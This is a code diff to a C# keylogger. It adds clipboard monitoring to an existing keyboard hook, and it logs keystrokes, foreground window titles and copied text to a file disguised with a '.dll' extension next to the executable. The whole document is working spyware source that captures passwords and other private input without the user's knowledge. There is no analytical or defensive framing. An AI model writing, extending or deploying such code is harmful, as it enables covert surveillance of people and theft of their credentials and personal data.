@@ -8,11 +8,17 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using WK.Libraries.SharpClipboardNS;
+using static WK.Libraries.SharpClipboardNS.SharpClipboard;
 
 namespace Keylogger
 {
     class Program
-    {   
+    {
+        string log = string.Empty;
+        string currentWindowTitle = string.Empty;
+
+
         // Get keys
         /**[DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);**/
@@ -24,6 +30,7 @@ namespace Keylogger
         [DllImport("user32.dll")]
         static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
 
+        [STAThread]
         static void Main(string[] args)
         {
             new Program().start();
@@ -32,9 +39,13 @@ namespace Keylogger
 
         private void start()
         {
-            string log = string.Empty;
-            string currentWindowTitle = string.Empty;
+            // Clipboard handler
+            var clipboard = new SharpClipboard();
+            clipboard.ObservableFormats.Texts = true;
+            clipboard.ClipboardChanged += ClipboardChanged;
 
+
+            // Key handler
             using (var api = new KeystrokeAPI())
             {
                 api.CreateKeyboardHook((character) => 
@@ -47,19 +58,14 @@ namespace Keylogger
                     if (windowTitle != currentWindowTitle && windowTitle != "")
                     {
                         currentWindowTitle = windowTitle;
-                        log += $"\n\n[Foreground Window : {currentWindowTitle}]\n";
+                        log += $"\n\n<newForegroundWindow>{currentWindowTitle}</newForegroundWindow>\n";
                     }
 
                     // Update the log variable
                     log += character2;
 
-                    // Write logs : https://docs.microsoft.com/fr-fr/dotnet/standard/io/how-to-write-text-to-a-file
-                    string path = System.IO.Path.GetDirectoryName(Application.ExecutablePath);
-                    string fileName = DateTime.UtcNow.ToString("MM-dd-yyyy") + ".dll";
-                    File.WriteAllText(Path.Combine(path, fileName), log);
-
-
-                    Console.WriteLine(log);
+                    // Write logs
+                    writeLogs(log);
                 });
 
                 Application.Run();
@@ -187,6 +193,33 @@ namespace Keylogger
                 windowTitle = Buff.ToString();
             }
             return windowTitle;
+        }
+
+        
+        private void ClipboardChanged(Object sender, ClipboardChangedEventArgs e)
+        {
+            if (e.ContentType == SharpClipboard.ContentTypes.Text)
+            {
+                log += "\n<newClipboardText>" + e.Content.ToString() + "</newClipboardText>\n";
+
+                // Write logs
+                writeLogs(log);
+            }
+
+            else
+            {
+                Console.WriteLine("no");
+            }
+        }
+
+        public void writeLogs(string log)
+        {
+            // Write logs : https://docs.microsoft.com/fr-fr/dotnet/standard/io/how-to-write-text-to-a-file
+            string path = System.IO.Path.GetDirectoryName(Application.ExecutablePath);
+            string fileName = "kl-" + DateTime.UtcNow.ToString("MM-dd-yyyy") + ".dll";
+            File.WriteAllText(Path.Combine(path, fileName), log);
+
+            Console.WriteLine(log);
         }
 
     }
